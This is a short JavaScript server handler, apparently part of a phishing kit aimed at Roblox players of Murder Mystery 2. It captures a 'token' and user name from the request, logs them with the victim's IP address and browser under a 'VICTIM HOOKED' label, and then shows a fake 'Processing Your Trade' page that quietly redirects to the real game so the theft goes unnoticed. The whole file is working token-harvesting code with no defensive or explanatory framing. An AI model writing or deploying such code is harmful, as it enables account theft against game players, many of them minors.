export default async function handler(req, res) {
    const { token, user } = req.query;
    
    try {
        // Logger les données de la victime
        console.log('🎣 VICTIM HOOKED:', {
            user: user || 'Unknown',
            token: token || 'No token',
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
            userAgent: req.headers['user-agent']
        });
        
        // Rediriger vers le vrai jeu après 3 secondes
        res.setHeader('Content-Type', 'text/html');
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Redirecting to Roblox...</title>
                <style>
                    body { 
                        background: #1a1a2e; 
                        color: white; 
                        font-family: Arial; 
                        display: flex; 
                        justify-content: center; 
                        align-items: center; 
                        height: 100vh; 
                        margin: 0; 
                    }
                    .container { 
                        text-align: center; 
                    }
                    .loader {
                        border: 5px solid #f3f3f3;
                        border-top: 5px solid #3498db;
                        border-radius: 50%;
                        width: 50px;
                        height: 50px;
                        animation: spin 2s linear infinite;
                        margin: 20px auto;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>🎁 Processing Your Trade...</h2>
                    <div class="loader"></div>
                    <p>Redirecting to Roblox...</p>
                </div>
                <script>
                    setTimeout(() => {
                        window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
                    }, 3000);
                </script>
            </body>
            </html>
        `);
        
    } catch (error) {
        // Fallback redirect
        res.redirect(302, 'https://www.roblox.com/games/142823291/Murder-Mystery-2');
    }
}